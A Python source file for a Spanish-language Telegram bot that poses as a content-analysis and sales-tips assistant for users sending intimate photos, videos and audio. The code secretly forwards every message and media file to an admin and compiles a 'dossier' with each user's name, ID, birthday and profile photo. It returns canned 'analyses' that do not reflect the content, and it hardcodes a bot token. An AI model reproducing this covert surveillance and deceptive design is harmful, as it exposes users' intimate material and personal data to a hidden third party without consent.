import os
import sqlite3
import requests
import io
import random
import re # <--- NUEVO: Para entender lo que ella escribe (ej. "me llamo...")
from PIL import Image, ImageStat
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ======================
# CONFIGURACIÓN
# ======================
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064
RENDER_EXTERNAL_URL = "https://luna-bot-a1fc.onrender.com"

# ======================
# BASE DE DATOS (CON MEMORIA Y DATOS)
# ======================
def init_db():
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    # Tabla de usuarios (guardamos la hora y la memoria del nombre)
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER, ultimo_mensaje TEXT, memoria_nombre TEXT)''')
    # Tabla para guardar el historial de chat
    c.execute('''CREATE TABLE IF NOT EXISTS historial
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, rol TEXT, mensaje TEXT)''')
    conn.commit()
    conn.close()

init_db()

def guardar_usuario(user_id, nombre, username, edad):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    ahora = datetime.now().isoformat()
    c.execute("INSERT OR REPLACE INTO usuarios (id, nombre, username, edad, ultimo_mensaje, memoria_nombre) VALUES (?, ?, ?, ?, ?, NULL)", (user_id, nombre, username, edad, ahora))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

def actualizar_tiempo(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    ahora = datetime.now().isoformat()
    c.execute("UPDATE usuarios SET ultimo_mensaje = ? WHERE id = ?", (ahora, user_id))
    conn.commit()
    conn.close()

def guardar_memoria_nombre(user_id, nombre_guardado):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE usuarios SET memoria_nombre = ? WHERE id = ?", (nombre_guardado, user_id))
    conn.commit()
    conn.close()

def guardar_en_historial(user_id, rol, mensaje):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("INSERT INTO historial (user_id, rol, mensaje) VALUES (?, ?, ?)", (user_id, rol, mensaje))
    # Mantenemos solo los últimos 15 mensajes para no saturar
    c.execute('''DELETE FROM historial WHERE user_id = ? AND id NOT IN 
                 (SELECT id FROM historial WHERE user_id = ? ORDER BY id DESC LIMIT 15)''', (user_id, user_id))
    conn.commit()
    conn.close()

def borrar_todo(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("DELETE FROM historial WHERE user_id = ?", (user_id,))
    c.execute("UPDATE usuarios SET memoria_nombre = NULL WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()

# ======================
# EXPEDIENTE COMPLETO (IGUAL)
# ======================
async def enviar_expediente_completo(context, user, fecha_texto, edad):
    try:
        pais = "Desconocido"
        try:
            ip_respuesta = requests.get("https://ipapi.co/json/", timeout=5).json()
            pais = ip_respuesta.get('country_name', 'Desconocido')
        except:
            pass

        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE COMPLETO**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Nombre:** {user.first_name} {user.last_name or ''}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"🎂 **Cumpleaños:** {fecha_texto} (Tiene {edad} años)\n"
            f"🌍 **País:** {pais}\n"
            f"🔗 **Usuario:** @{user.username if user.username else 'Oculto'}\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        
        fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=1)
        if fotos_perfil.total_count > 0:
            foto_perfil = fotos_perfil.photos[0][-1].file_id
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Foto de perfil.")
    except Exception as e: 
        print(f"Error en expediente: {e}")

# ======================
# REENVIAR AL ADMIN (IGUAL)
# ======================
async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        msg = update.message
        usuario_actual = update.effective_user
        texto_aviso = f"📩 **MENSAJE DE:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
        if msg.forward_origin:
            texto_aviso = f"🔄 **REENVIADO A TI (Dani)**\n📩 **De:** {usuario_actual.first_name}"

        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
        await context.bot.forward_message(chat_id=DANI_CHAT_ID, from_chat_id=update.effective_chat.id, message_id=update.message.message_id)
    except Exception as e:
        print(f"Error reenviando al admin: {e}")

# ======================
# ANÁLISIS DE CONTENIDO (LUZ REAL Y VENTAS)
# ======================
def analizar_contenido(tipo="foto", imagen_bytes=None):
    calidad_luz = "La luz está un poco plana."
    if imagen_bytes:
        try:
            img = Image.open(io.BytesIO(imagen_bytes)).convert('L')
            stat = ImageStat.Stat(img)
            brillo = stat.mean[0] 
            if brillo < 60:
                calidad_luz = "La foto está muy oscura. Te recomiendo usar una luz más suave o acercarte a una ventana. 💡"
            elif brillo > 180:
                calidad_luz = "La foto está demasiado iluminada (parece que usaste flash directo). Prueba con una luz más suave. 💡"
            else:
                calidad_luz = "¡La luz está perfecta! Resalta bien tu cuerpo de forma natural. 💡"
        except: pass

    if tipo == "video" or tipo == "gif":
        return f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una pose muy provocativa. El movimiento de cámara es un poco rápido.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta ir más lento, mantén la mirada fija en la cámara.\n4. **Tip de venta:** Los videos donde hablas suave venden muchísimo más. 😉"
    elif tipo == "audio":
        return "🎧 **Análisis de tu audio:**\n1. **Lo que escucho:** Tu tono de voz es muy sugerente y natural.\n2. **Lo bueno:** La cercanía al micrófono hace que se escuche íntimo.\n3. **Cómo mejorarlo:** Intenta bajar un poco más la voz, casi en un susurro.\n4. **Tip de venta:** Los audios personalizados se venden carísimos. 😈"
    else:
        return f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy atrevida. La pose resalta perfecto.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a poner la luz más de lado (lateral). También prueba a morderte el labio.\n4. **Tip de venta:** Esta foto es perfecta para un mensaje PPV a primera hora de la mañana. 🔥"

# ======================
# LÓGICA DE CHAT CON SECUENCIA Y MEMORIA DE NOMBRE
# ======================
def generar_respuesta_chat(user_id, mensaje):
    usuario = obtener_usuario(user_id)
    memoria_nombre = usuario[5] # La columna donde guardamos el nombre
    msg_lower = mensaje.lower()
    
    # 1. DETECTAR SI ELLA DICE SU NOMBRE (Ej: "me llamo maria", "soy maria", "mi nombre es maria")
    match_nombre = re.search(r"(?:me llamo|soy|mi nombre es)\s+([a-zA-ZáéíóúÁÉÍÓÚñÑ]+)", msg_lower)
    if match_nombre:
        nombre_extraido = match_nombre.group(1).capitalize()
        guardar_memoria_nombre(user_id, nombre_extraido)
        return f"¡Mucho gusto, {nombre_extraido}! 😘 Me encanta conocerte. ¿En qué te puedo ayudar hoy?"
        
    # 2. DETECTAR SI PREGUNTA SU NOMBRE (Ej: "como me llamo", "sabes mi nombre")
    if "como me llamo" in msg_lower or "mi nombre" in msg_lower or "quien soy" in msg_lower:
        if memoria_nombre:
            return f"¡Claro que sí! Te llamas {memoria_nombre}. 😉 No me olvido de ti tan fácil."
        else:
            return "Uy, no me has dicho tu nombre todavía. ¿Cómo te llamas? ✨"

    # 3. RESPUESTAS DE SECUENCIA NORMALES (Saludos, gracias, etc.)
    if "hola" in msg_lower or "buenas" in msg_lower:
        saludo = f"¡Hola {memoria_nombre}!" if memoria_nombre else "¡Hola!"
        return random.choice([f"{saludo} 😘 ¿Cómo estás?", f"{saludo} preciosa. ¿En qué te ayudo?", "¡Hey! 🔥 Me alegra leerte."])
    elif "bien" in msg_lower or "como estas" in msg_lower:
        return "¡Súper bien! 💋 Lista para ayudarte a mejorar tu contenido. ¿Qué me traes hoy?"
    elif "gracias" in msg_lower:
        return "¡De nada, amor! 😈 Para eso estoy. ¿Quieres que analice alguna foto o video?"
    elif "bye" in msg_lower or "adios" in msg_lower or "chao" in msg_lower:
        return "¡Adiós! 🌙 Aquí estaré cuando me necesites. ¡Que tengas buen día!"
    
    # 4. RESPUESTA POR DEFECTO
    return random.choice([
        "Cuéntame más... 😉", 
        "Interesante. ¿Y eso cómo te hace sentir?", 
        "Mmm, me gusta de lo que hablas. Mándame una foto si quieres consejos.",
        "Jaja, me encanta hablar contigo. ¿Quieres que veamos alguna foto tuya? 🔥"
    ])

# ======================
# HANDLERS MULTIMEDIA
# ======================
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    actualizar_tiempo(user_id)
    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
    
    try:
        photo_file = await update.message.photo[-1].get_file()
        photo_bytes = await photo_file.download_as_bytearray()
        analisis = analizar_contenido(tipo="foto", imagen_bytes=photo_bytes)
        await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien.")

async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    actualizar_tiempo(user_id)
    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")

    try:
        file = None
        if update.message.video and update.message.video.thumbnail:
            file = await update.message.video.thumbnail.get_file()
        elif update.message.video_note and update.message.video_note.thumbnail:
            file = await update.message.video_note.thumbnail.get_file()
        elif update.message.animation and update.message.animation.thumbnail:
            file = await update.message.animation.thumbnail.get_file()

        if file:
            img_bytes = await file.download_as_bytearray()
            analisis = analizar_contenido(tipo="video", imagen_bytes=img_bytes)
            await msg.edit_text(analisis)
        else:
            analisis = analizar_contenido(tipo="video", imagen_bytes=None)
            await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("🎬 Vi tu video y ya lo recibí.")

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    actualizar_tiempo(user_id)
    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🎧 Escuchando tu audio...")
    
    try:
        analisis = analizar_contenido(tipo="audio")
        await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("🎧 Escuché tu audio, pero no pude analizarlo bien.")

# ======================
# HANDLERS DE TEXTO Y REGISTRO
# ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        await update.message.reply_text("¡Hola! 🌙 Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:")
    else:
        actualizar_tiempo(user_id)
        await update.message.reply_text("¡Hola de nuevo! 😘 ¿En qué te ayudo hoy? Mándame foto, video o audio.")

async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.effective_user
    if text.startswith('/'): return

    usuario_db = obtener_usuario(user.id)
    
    if usuario_db:
        # LÓGICA DE LOS 15 MINUTOS (Expiración de sesión)
        ultimo_mensaje_str = usuario_db[4]
        if ultimo_mensaje_str:
            ultimo_mensaje = datetime.fromisoformat(ultimo_mensaje_str)
            ahora = datetime.now()
            diferencia = ahora - ultimo_mensaje
            
            if diferencia > timedelta(minutes=15):
                borrar_todo(user.id) # ¡BORRA MEMORIA Y NOMBRE!
                await update.message.reply_text("⏳ **Sesión cerrada por inactividad.**\n\n¡Hola de nuevo! 🌙 ¿De qué hablábamos? Mándame una foto, video o audio para empezar.")
                actualizar_tiempo(user.id)
                await reenviar_al_admin(update, context)
                return

        # SI SIGUE ACTIVA, RESPONDE CON MEMORIA
        actualizar_tiempo(user.id)
        await reenviar_al_admin(update, context)
        
        await update.message.chat.send_action(action="typing") 
        respuesta = generar_respuesta_chat(user.id, text)
        return await update.message.reply_text(respuesta)
    
    try:
        fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
        hoy = datetime.now()
        edad = hoy.year - fecha_nacimiento.year - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))

        if edad < 18: return await update.message.reply_text("Debes ser mayor de 18 años.")
            
        guardar_usuario(user.id, user.first_name, user.username, edad)
        await update.message.reply_text(f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos, videos o audios.")
        
        await enviar_expediente_completo(context, user, text, edad)
        
    except:
        await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA")

# ======================
# MAIN (WEBHOOKS)
# ======================
if __name__ == "__main__":
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
    application.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))

    port = int(os.environ.get("PORT", 8080))

    print("🌙 Luna Bot iniciado con memoria de nombre y secuencia...")
    application.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=TELEGRAM_TOKEN,
        webhook_url=f"{RENDER_EXTERNAL_URL}/{TELEGRAM_TOKEN}"
    )
